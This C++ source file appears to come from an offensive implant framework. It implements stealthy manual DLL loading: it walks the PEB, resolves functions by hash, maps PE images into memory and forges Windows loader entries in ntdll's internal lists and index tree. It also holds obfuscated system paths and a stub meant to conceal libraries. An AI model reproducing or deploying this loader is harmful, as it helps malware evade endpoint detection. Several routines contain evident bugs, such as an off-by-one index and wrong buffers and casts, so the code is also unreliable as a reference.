#include <core/include/modules.hpp>

// TODO: github did not save any of my progress somehow. moving to gitlab.

using namespace Hash;
using namespace Opsec;
using namespace Memory::Methods;

__attribute__((used, section(".rdata"))) uint8 sys32[] = { 0x43,0x00,0x3a,0x00,0x5c,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x5c,0x00,0x5c,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x6d,0x00,0x33,0x00,0x32,0x00,0x5c,0x00,0x5c,0x00,0x00,0x00 };
__attribute__((used, section(".rdata"))) uint8 sys32_all[] = { 0x43,0x3a,0x5c,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x5c,0x53,0x79,0x73,0x74,0x65,0x6d,0x33,0x32,0x5c,0x5c,0x2a,0x00 };
__attribute__((used, section(".rdata"))) uint8 dot_dll[] = { 0x2e,0x64,0x6c,0x6c,0x00 };

namespace Modules {

    PLDR_DATA_TABLE_ENTRY FindModuleEntry(const uint32 hash) {
        const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

        for (auto next = head->Flink; next != head; next = next->Flink) {
            const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            const auto name = mod->BaseDllName;

            // TODO: need checks to prevent overflows tho unlikely
            wchar_t buffer[MAX_PATH] = { };

            if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
                return mod;
            }
        }

        return nullptr;
    }

    FARPROC FindExportAddress(CONST VOID *base, CONST uint32 hash) {
        FARPROC address = nullptr;

        const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
        const auto exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return address;
        }

        for (auto index = 0; index < exports->NumberOfNames; index++) {
            const auto name = (char *) (base + ((uint32_t *) (base + exports->AddressOfNames))[index - 1]);

            // TODO: need checks to prevent overflows
            char buffer[MAX_PATH] = { };

            if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
                address = (FARPROC) (base + ((uint32_t *) (base + exports->AddressOfFunctions))[index]);
                break;
            }
        }

        return address;
    }

    VOID InsertTailList(LIST_ENTRY *const head, LIST_ENTRY *const entry) {
        PLIST_ENTRY blink = head->Blink;

        entry->Flink   = head;
        entry->Blink   = blink;
        blink->Flink   = entry;
        head->Blink	= entry;
    }

    PLIST_ENTRY FindHashTable() {
        PLIST_ENTRY list = nullptr;
        PLIST_ENTRY head = nullptr;
        PLIST_ENTRY entry = nullptr;
        PLDR_DATA_TABLE_ENTRY current = nullptr;

        PPEB peb = PEB_POINTER;

        head = &peb->Ldr->InInitializationOrderModuleList;
        entry = head->Flink;

        do {
            current = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
            entry = entry->Flink;

            if (current->HashLinks.Flink == &current->HashLinks) {
                continue;
            }

            list = current->HashLinks.Flink;

            if (list->Flink == &current->HashLinks) {
                ULONG hash = LdrHashEntry(current->BaseDllName, true);

                list = (PLIST_ENTRY) ((size_t) current->HashLinks.Flink - hash * sizeof(LIST_ENTRY));
                break;
            }

            list = nullptr;
        } while (head != entry);

        return list;
    }

    BOOL AddHashTableEntry(PLDR_DATA_TABLE_ENTRY entry) {
        PPEB peb = PEB_POINTER;

        PLIST_ENTRY hash_table = FindHashTable();
        if (!hash_table) {
            return false;
        }

        INIT_LIST_ENTRY(&entry->HashLinks);

        // insert into hash table
        ULONG hash = LdrHashEntry(entry->BaseDllName, true);

        InsertTailList(&hash_table[hash], &entry->HashLinks);
        InsertTailList(&peb->Ldr->InLoadOrderModuleList, &entry->InLoadOrderLinks);
        InsertTailList(&peb->Ldr->InMemoryOrderModuleList, &entry->InMemoryOrderLinks);
        InsertTailList(&peb->Ldr->InInitializationOrderModuleList, &entry->InInitializationOrderLinks);

        return true;
    }

    BOOL LocalLdrFindExportAddress(HMODULE module, const MBS_BUFFER *fn_name, const uint16 ordinal, void **function) {
        PIMAGE_SECTION_HEADER section = nullptr;

        void *text_start = nullptr;
        void *text_end = nullptr;

        if (!module) {
            return false;
        }

        PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, module, ((PIMAGE_DOS_HEADER) module)->e_lfanew);
        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }

        for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
            PIMAGE_SECTION_HEADER section = ITER_SECTION_HEADER(module, sec_index);

            uint32 sec_hash = HashStringA((char *) section->Name, MbsLength((char *) section->Name));
            uint32 dot_text = TEXT;

            if (MemCompare((void *) &dot_text, (void *) &sec_hash, sizeof(uint32))) {
                text_start = RVA(PVOID, module, section->VirtualAddress);
                text_end = RVA(PVOID, text_start, section->SizeOfRawData);
                break;
            }
        }

        if (!text_start || !text_end) {
            // NOTE: not sure why this would happen
            return false;
        }

        PIMAGE_DATA_DIRECTORY data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (data_dire->Size) {
            const IMAGE_EXPORT_DIRECTORY *exports = RVA(PIMAGE_EXPORT_DIRECTORY, module, data_dire->VirtualAddress);
            const uint32 n_entries = !fn_name ? exports->NumberOfFunctions : exports->NumberOfNames;

            for (int ent_index = 0; ent_index < n_entries; ent_index++) {
                uint32 fn_ordinal = 0;
                bool found = false;

                if (!fn_name) {
                    uint32 *p_rva = RVA(uint32*, module, exports->AddressOfNames + ent_index * sizeof(uint32));
                    const char *name = RVA(const char*, module, *p_rva);

                    if (MbsLength(name) != fn_name->length) {
                        continue;
                    }
                    if (MbsCompare(name, fn_name->buffer)) {
                        found = true;
                        short *p_rva2 = RVA(short *, module, exports->AddressOfNameOrdinals + ent_index * sizeof(uint16));
                        fn_ordinal = exports->Base + *p_rva2;
                    }
                } else {
                    int16 *p_rva2 = RVA(short*, module, exports->AddressOfNameOrdinals + ent_index * sizeof(uint16));
                    fn_ordinal = exports->Base + *p_rva2;

                    if (fn_ordinal == ordinal) {
                        found = true;
                    }
                }

                if (found) {
                    const uint32 *pfn_rva = RVA(uint32*, module, exports->AddressOfFunctions + sizeof(uint32) * (fn_ordinal - exports->Base));
                    void *fn_pointer = RVA(void*, module, *pfn_rva);

                    // this is ...
                    if (text_start > fn_pointer || text_end < fn_pointer) {

                        size_t full_length = MbsLength((char*) fn_pointer);
                        int lib_length = 0;

                        for (int i = 0; i < full_length; i++) {
                            if (((char*) fn_pointer)[i] == '.') {
                                lib_length = i;
                                break;
                            }
                        }

                        if (lib_length != 0) {

                            MBS_BUFFER fn_buffer = { };
                            char *fn_name = (char *) fn_pointer + lib_length + 1;

                            FILL_MBS(fn_buffer, fn_name);

                            char lower[256] = { };
                            char lib_name[256] = { };

                            MbsCopy(lib_name, (char*) fn_pointer, lib_length);
                            MbsCopy(lib_name + lib_length, (char*) dot_dll, 5);

                            MbsToLower(lower, lib_name);
                            uint32 name_hash = HashStringA(lower, lib_length);

                            LDR_DATA_TABLE_ENTRY *lib_entry = FindModuleEntry(name_hash);
                            if (!lib_entry || lib_entry->DllBase == module) {
                                return false;
                            }

                            if (!LocalLdrFindExportAddress((HMODULE) lib_entry->DllBase, &fn_buffer, 0, &fn_pointer)) {
                                return false;
                            }
                        }
                    }
                    *function = fn_pointer;
                    return true;
                }
            }
        }
        return false;
    }

    BOOL ResolveImports(const EXECUTABLE *module) {
        PIMAGE_IMPORT_BY_NAME import_name      = nullptr;
        PIMAGE_DELAYLOAD_DESCRIPTOR delay_desc = nullptr;
        PIMAGE_THUNK_DATA first_thunk          = nullptr;
        PIMAGE_THUNK_DATA org_first            = nullptr;

        IMAGE_DATA_DIRECTORY *data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        MBS_BUFFER mbs_import = { };

        if (data_dire->Size) {
            PIMAGE_IMPORT_DESCRIPTOR import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, module->base, data_dire->VirtualAddress);
            PIMAGE_IMPORT_DESCRIPTOR scan = import_desc;

            DWORD count = 0;
            for (; scan->Name; scan++) {
                count++;
            }

            for (; import_desc->Name; import_desc++) {
                HMODULE library = nullptr;

                char lower[MAX_PATH] = { };
                const char *name = (char*) module->base + import_desc->Name;

                MbsToLower(lower, name);
                const uint32 name_hash = HashStringA(lower, MbsLength(lower));

                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(name_hash)) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, name_hash, nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->FirstThunk);
                org_first = RVA(PIMAGE_THUNK_DATA, module->base, import_desc->OriginalFirstThunk);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
                        FILL_MBS(mbs_import, import_name->Name);

                        if (!LocalLdrFindExportAddress(library, &mbs_import, 0, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

        // handle the delayed import table
        data_dire = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

        if (data_dire->Size) {
            delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, module->base, data_dire->VirtualAddress);

            for (; delay_desc->DllNameRVA; delay_desc++) {
                HMODULE library = nullptr;

                char lower[MAX_PATH] = { };
                const char *lib_name = (char*) module->base + delay_desc->DllNameRVA;

                MbsToLower(lower, lower);
                const uint32 name_hash = HashStringA(lower, MbsLength(lib_name));

                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(name_hash)) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, name_hash, nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

                    // TODO: memory leak here. Do something with this new module.
                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportAddressTableRVA);
                org_first = RVA(PIMAGE_THUNK_DATA, module->base, delay_desc->ImportNameTableRVA);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (WORD) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, module->base, org_first->u1.AddressOfData);
                        FILL_MBS(mbs_import, import_name->Name);

                        if (!LocalLdrFindExportAddress(library, &mbs_import, 0, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

        return true;
    }

    PRTL_RB_TREE FindModuleIndex() {
        PRTL_BALANCED_NODE node = nullptr;
        PRTL_RB_TREE index      = nullptr;

        PLDR_DATA_TABLE_ENTRY entry = FindModuleEntry(NTDLL);
        SIZE_T end = 0;

        node = &entry->BaseAddressIndexNode;
        do {
            node = (PRTL_BALANCED_NODE) (node->ParentValue & ~0x7);
        } while (node->ParentValue & ~0x7);


        if (!node->Red) {
            uint32 length = 0;
            size_t begin = 0;

            PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, entry->DllBase, ((PIMAGE_DOS_HEADER) entry->DllBase)->e_lfanew);
            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);

            for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
                uint32 sec_hash = HashStringA((char *) section->Name, MbsLength((char *) section->Name));
                uint32 dot_data = DATA;

                if (MemCompare((void *) &dot_data, (void *) &sec_hash, sizeof(uint32)) == 0) {
                    begin = (size_t) entry->DllBase + section->VirtualAddress;
                    length = section->Misc.VirtualSize;
                    break;
                }

                ++section;
            }

            for (auto i = 0; i < length - sizeof(size_t); ++begin, ++i) {
                size_t stRet = MemCompare((void *) begin, &node, sizeof(size_t));

                if (stRet == sizeof(size_t)) {
                    end = begin;
                    break;
                }
            }

            if (end == 0) {
                return nullptr;
            }

            PRTL_RB_TREE rb_tree = (PRTL_RB_TREE) end;

            if (rb_tree && rb_tree->Root && rb_tree->Min) {
                index = rb_tree;
            }
        }

        return index;
    }


    BOOL MapModule(EXECUTABLE *module) {
        HEXANE;

        auto region_size = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
        const auto pre_base = module->nt_head->OptionalHeader.ImageBase;

        module->base = pre_base;

        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
            module->base != pre_base) {
            module->base = 0;
            region_size = module->nt_head->OptionalHeader.SizeOfImage;

            if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
                return false;
            }
        }

        for (auto head_index = 0; head_index < module->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
            B_PTR(module->base)[head_index] = module->buffer[head_index];
        }

        for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
            for (auto sec_index = 0; sec_index < module->section->SizeOfRawData; sec_index++) {
                (B_PTR(module->base + module->section->VirtualAddress))[sec_index] = (module->buffer + module->section->PointerToRawData)[sec_index];
            }
        }

        UINT_PTR base_rva = module->base - pre_base;
        PIMAGE_DATA_DIRECTORY relocdir = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        // if non-zero rva and relocdir exists...
        if ((module->base - pre_base) && relocdir) {
            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);

            do {
                PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;

                do {
                    switch (head->Type) {
                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                    }
                    head++;
                } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

                reloc = (PIMAGE_BASE_RELOCATION) head;
            } while (reloc->VirtualAddress);
        }

        module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
        return true;
    }

    BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, const void *base) {
        HEXANE;

        PRTL_RB_TREE index = FindModuleIndex();
        if (!index) {
            return false;
        }

        bool right_hand = false;
        PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY) ((size_t) index - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));

        do {
            // NOTE: looking for correct in-memory order placement according to RB Tree
            if (base < node->DllBase) {
                if (!node->BaseAddressIndexNode.Left) {
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else if (base > node->DllBase) {
                if (!node->BaseAddressIndexNode.Right) {
                    right_hand = true;
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else {
                node->DdagNode->LoadCount++;
            }
        } while (true);

        if (!ctx->win32.RtlRbInsertNodeEx(index, &node->BaseAddressIndexNode, right_hand, &entry->BaseAddressIndexNode)) {
            return false;
        }

        return true;
    }

    BOOL FindModule(EXECUTABLE *module, const uint32 name_hash) {
        HEXANE;

        LARGE_INTEGER size    = { };
        WIN32_FIND_DATAA data = { };

        if (!name_hash) {
            return false;
        }

        HANDLE handle = ctx->win32.FindFirstFileA((char*) sys32_all, &data);
        if (handle == INVALID_HANDLE_VALUE) {
            return false;
        }

        do {
            if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                continue;
            }

            const char *name = data.cFileName;

            if (HashStringA(name, MbsLength(name)) == name_hash) {
                module->local_name = (wchar_t*) Malloc(MbsLength(name) * sizeof(wchar_t) + 1);
                MbsToWcs(module->local_name, name, MbsLength(name));
            }
        } while(ctx->win32.FindNextFileA(handle, &data));

        module->cracked_name = (wchar_t *) Malloc(MAX_PATH * sizeof(wchar_t));

        if (!module->cracked_name) {
            Free(module->local_name);
            return false;
        }

        MemCopy(module->cracked_name, sys32, sizeof(sys32));
        MemCopy(module->cracked_name + (sizeof(sys32)), module->local_name, WcsLength(module->local_name));

        return true;
    }

    BOOL ReadModule(EXECUTABLE *module) {
        HEXANE;

        HANDLE handle = ctx->win32.CreateFileW(module->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (handle == INVALID_HANDLE_VALUE) {
            return false;
        }

        SIZE_T size = ctx->win32.GetFileSize(handle, nullptr);
        if (size == INVALID_FILE_SIZE) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void **) &module->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!ctx->win32.ReadFile(handle, module->buffer, size, (DWORD *) &module->size, nullptr)) {
            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void **) &module->buffer, &module->size, 0);
            ctx->win32.NtClose(handle);
            return false;
        }

        ctx->win32.NtClose(handle);
        return true;
    }


    BOOL LinkModule(EXECUTABLE *module) {
        HEXANE;

        PIMAGE_NT_HEADERS nt_head;
        UNICODE_STRING FullDllName, BaseDllName;

        nt_head = RVA(PIMAGE_NT_HEADERS, module->buffer, ((PIMAGE_DOS_HEADER)module->buffer)->e_lfanew);

        ctx->win32.RtlInitUnicodeString(&FullDllName, module->local_name);
        ctx->win32.RtlInitUnicodeString(&BaseDllName, module->cracked_name);

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) Malloc(sizeof(LDR_DATA_TABLE_ENTRY));
        if (!entry) {
            return false;
        }

        // start setting the values in the entry
        ctx->win32.NtQuerySystemTime(&entry->LoadTime);

        // do the obvious ones
        entry->ReferenceCount = 1;
        entry->LoadReason = LoadReasonDynamicLoad;
        entry->OriginalBase = nt_head->OptionalHeader.ImageBase;

        // set the hash value
        entry->BaseNameHashValue = LdrHashEntry(BaseDllName, false);

        // correctly add the base address to the entry
        AddModuleEntry(entry, (void *) module->base);

        // and the rest
        entry->ImageDll = true;
        entry->LoadNotificationsSent = true; // :melt:
        entry->EntryProcessed = true;
        entry->InLegacyLists = true;
        entry->InIndexes = true;
        entry->ProcessAttachCalled = true;
        entry->InExceptionTable = false;
        entry->DllBase = (void *) module->base;
        entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
        entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
        entry->BaseDllName = BaseDllName;
        entry->FullDllName = FullDllName;
        entry->ObsoleteLoadCount = 1;
        entry->Flags = LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;

        // set the correct values in the Ddag node struct
        entry->DdagNode = (PLDR_DDAG_NODE) Malloc(sizeof(LDR_DDAG_NODE));

        if (!entry->DdagNode) {
            return 0;
        }

        entry->NodeModuleLink.Flink = &entry->DdagNode->Modules;
        entry->NodeModuleLink.Blink = &entry->DdagNode->Modules;
        entry->DdagNode->Modules.Flink = &entry->NodeModuleLink;
        entry->DdagNode->Modules.Blink = &entry->NodeModuleLink;
        entry->DdagNode->State = LdrModulesReadyToRun;
        entry->DdagNode->LoadCount = 1;

        // add the hash to the hash_table
        AddHashTableEntry(entry);

        // set the entry point
        entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(void *, module->base, nt_head->OptionalHeader.AddressOfEntryPoint);

        return true;
    }

    PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
        // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
        HEXANE;

        EXECUTABLE *module = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
		EXECUTABLE *image = nullptr;

        if (!module) {
            return nullptr;
        }

        module->success = false;
        module->link = true;

        switch (LOWORD(load_type)) {
            case LoadLocalFile:
            if (!FindModule(module, name_hash) || !ReadModule(module)) {
                goto defer;
            }
            break;

            case LoadMemory:
            module->size = mem_size;
            module->buffer = memory;
            module->cracked_name = name;
            module->local_name = name;

            if (name == nullptr) {
                goto defer;
            }
            break;

            default:
            break;
        }

        if (load_type & NoLink)
            module->link = false;

        if (name == nullptr) {
            name = module->cracked_name;
        }

        if ((load_type & LoadBof) != LoadBof) {
            if (LDR_DATA_TABLE_ENTRY *check_module = FindModuleEntry(HashStringW(name, WcsLength(name)))) {
                module->base = (uintptr_t) check_module->DllBase;
                module->success = true;

                goto defer;
            }
        }

        image = CreateImage(module->buffer);
        if (!ImageCheckArch(image)) {
            goto defer;
        }

        // TODO: DestroyImage(module);
        Free(image);

        // map the sections into memory
        if (!MapModule(module) || !ResolveImports(module)) {
            goto defer;
        }

        if (module->link) {
            if (!LinkModule(module)) {
                goto defer;
            }
        }

        // trigger tls callbacks, set permissions and call the entry point
        if (!BeginExecution(module)) {
            goto defer;
        }

        module->success = true;

        defer:
        // TODO: delete the _executable* and keep the base. that's all I need tbh...
        return module;
    }


    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
        // TODO:
        return false;
    }
}

